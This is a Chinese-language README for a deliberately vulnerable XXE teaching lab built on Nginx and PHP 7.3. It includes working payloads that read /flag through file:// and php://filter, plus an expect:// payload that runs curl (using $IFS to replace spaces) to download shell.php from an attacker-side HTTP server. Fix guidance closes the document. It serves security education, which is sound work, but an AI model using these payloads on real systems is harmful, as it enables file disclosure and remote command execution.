# XXE（XML 外部实体）漏洞演示靶场

基于与 `web-nginx-php73` 同类的 **Nginx + PHP 7.3** 容器思路，目录 `xxe/`。用于课堂演示：**原理与场景**、**`file://` 读文件**、**`php://filter`**、**`expect://` 命令链**（需 PECL expect），并配合**考试机 `python -m http.server`** 做下载链路演示。

---


---

## 一、环境说明

| 项目 | 说明 |
|------|------|
| 运行栈 | `Nginx` + `PHP 7.3`（FPM） |
| Web 根目录 | `/var/www/html` |
| FLAG | 容器启动写入 `/flag`（`DASFLAG` / `FLAG` / `GZCTF_FLAG`，否则默认测试 flag） |
| 默认端口 | `docker-compose` 映射 **8081 → 80**（与访问控制靶场 8080 区分） |

### 两种镜像（重要）

| 镜像 | Dockerfile | 说明 |
|------|------------|------|
| **默认（Alpine，体积小）** | `Dockerfile` | 可稳定演示 **`file://`**、**`php://filter`**；**未**内置 PECL **expect**，无法真实执行 **`expect://`** |
| **含 expect（课堂 RCE 链）** | `Dockerfile.with-expect`（Debian） | 已编译启用 **PECL expect**，可演示 **`expect://curl ...`** 等命令链 |

---

## 二、快速启动

### 1）默认镜像（文件读取 + php://filter）

```bash
cd xxe
docker build -t xxe-lab .
docker run -d --name xxe-lab -p 8081:80 xxe-lab
```

访问：`http://127.0.0.1:8081`

### 2）含 expect 的镜像（expect:// 演示）

```bash
cd xxe
docker build -f Dockerfile.with-expect -t xxe-lab-expect .
docker rm -f xxe-lab-expect 2>nul
docker run -d --name xxe-lab-expect -p 8081:80 xxe-lab-expect
```

首页会显示 **「PECL expect：已加载」**。

### 3）docker-compose

```bash
cd xxe/docker
docker-compose up -d
```

> 当前 `docker-compose` 使用根目录 **`Dockerfile`（Alpine）**。若需 expect，请改用上一节命令手动构建 **`Dockerfile.with-expect`**，或自行修改 compose 的 `build`/`image` 字段。

---

## 三、XXE 原理（简述）

1. **XML 实体**：在 DTD 中可声明实体；**外部实体**使用 `SYSTEM "URI"`，由解析器去解析 URI 指向的资源。
2. **展开实体**：若使用 **`LIBXML_NOENT`** 等选项，实体会被**替换**进文档树，后续可被业务逻辑**回显**或触发副作用。
3. **不同 URI 的含义**：
   - **`file://`**：读本地文件（最常见的信息泄露）。
   - **`http(s)://`**：可能形成 **SSRF**（视解析器与网络策略而定）。
   - **`php://filter/...`**：在 PHP 中通过封装器做**编码/过滤**，常用于绕过或读出 PHP 源码/资源。
   - **`expect://`**：若 PHP 安装 **PECL expect**，可经 expect 解释执行**命令字符串**（典型高危，仅授权环境演示）。

---

## 四、典型业务场景（为何会出现）

- 接口接收 **XML/SOAP**、上传 **XML**、导入配置、对接遗留系统的 **XML 数据交换**。
- 使用 `DOMDocument::loadXML`、`SimpleXML` 等且**未禁用外部实体**或使用了**不安全解析选项**。
- 将解析后的 XML **内容回显**给前端，或带外通道（OOB）可观测。

---

## 五、演示 1：`file://` 构造读文件

### 思路

在 DTD 中声明：

```text
<!ENTITY xxe SYSTEM "file:///flag">
```

在元素中引用 `&xxe;`，解析展开后内容进入 DOM，本靶场在 `/xxe.php` 回显。

### 示例 Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<data>&xxe;</data>
```

### 复现

打开首页 `index.php`，点击「载入 file 读 /flag 模板」→「解析 XML」，在回显中查看 FLAG。

---

## 六、演示 2：`php://filter` 读文件（编码/绕过）

### 思路

通过 PHP 流封装器对资源做**读取 + 转换**，例如 **Base64** 编码后再进入文档，便于在部分过滤场景下带出数据或做二次解码。

示例（读 `/flag` 并 Base64 编码）：

```text
php://filter/read=convert.base64-encode/resource=/flag
```

### 示例 Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
]>
<data>&xxe;</data>
```

### 复现

首页点击「载入 php://filter 模板」→提交。回显为 Base64 时，可用本地解码工具还原。

---

## 七、演示 3：`expect://` + `curl` + 考试机 HTTP（教学链路）

### 前置条件

- 使用 **`Dockerfile.with-expect`** 构建的镜像（**PECL expect 已加载**）。
- 考试机/攻击机可访问（同网段或路由可达），用于起 HTTP 服务。

### 考试机：托管演示文件

在仓库 **`xxe/attacker-demo/`** 中已提供无害演示文件 `shell.php`（仅输出固定文本，**禁止用于未授权目标**）。

```bash
cd xxe/attacker-demo
python3 -m http.server 9999
```

浏览器访问：`http://<考试机IP>:9999/shell.php` 确认可访问。

### 靶机：XML 示例（与常见教学写法一致）

将下面 IP/端口改为你的考试机；若需与资料完全一致，可保留 **`$IFS` 代替空格** 的写法：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'http://192.168.0.103:9999/shell.php'">
]>
<root>
    <name></name>
    <email>&xxe;</email>
</root>
```

**说明：**

- **`expect://`** 后的字符串由 **expect 扩展**解释，属于**命令执行类**利用链，风险极高。
- **`curl -O`** 将文件保存到 **当前工作目录**（与 PHP-FPM 进程配置有关）；课堂重点通常放在「**命令是否被触发、HTTP 侧是否收到请求**」，落盘路径可结合日志再讲。
- 若 URL 需带路径，请使用完整形式：`http://IP:端口/shell.php`（上例已带 `http://`）。

### 课堂观察建议

- 在考试机侧观察 **HTTP 访问日志** 是否出现靶机来源 IP 的 `GET /shell.php`。
- 首页与解析结果页会提示 **expect 是否加载**，避免学员在错误镜像上误判「payload 写错」。

---

## 八、完整 WriteUp（最小步骤）

1. 启动默认镜像或 expect 镜像（见第二节）。
2. 访问 `http://127.0.0.1:8081/index.php`。
3. 依次载入 **file** / **php://filter** / **expect** 模板并提交。
4. expect 场景先起 `python3 -m http.server`，再提交 XML。

### curl 原始 POST（可选）

```bash
curl -s -X POST "http://127.0.0.1:8081/xxe.php" \
  -H "Content-Type: application/xml" \
  --data-binary @- <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<data>&xxe;</data>
EOF
```

---

## 九、漏洞根因（对照教学）

1. **解析选项不当**：`LIBXML_NOENT` + `LIBXML_DTDLOAD` 等组合易触发实体展开与外部引用。
2. **外部实体未禁用**：未保持 `libxml_disable_entity_loader(true)`（PHP 7.x）或等价安全策略（本靶场为复现**显式关闭**）。
3. **`expect://`**：属于**扩展面**——安装了 PECL expect 即增加一类高危 URI。

---

## 十、修复建议（简述）

- 禁用外部实体与 DTD；避免对不可信 XML 使用 `LIBXML_NOENT` / `LIBXML_DTDLOAD`。
- 生产环境勿安装不必要的 PECL（如 expect）；最小化 PHP 扩展。
- 最小化回显；关键接口做审计与告警。

---

## 十一、文件说明

| 路径 | 说明 |
|------|------|
| `Dockerfile` | 默认 Alpine 镜像 |
| `Dockerfile.with-expect` | 含 PECL expect（Debian） |
| `src/index.php` | 教学首页与 Payload 模板 |
| `src/xxe.php` | 漏洞解析点 |
| `attacker-demo/shell.php` | 考试机 HTTP 演示文件 |
| `docker/docker-compose.yaml` | 一键启动（默认 Dockerfile） |

---

## 十二、声明

本项目仅用于**合法授权**的安全教学与考试演示，请勿用于未授权系统。
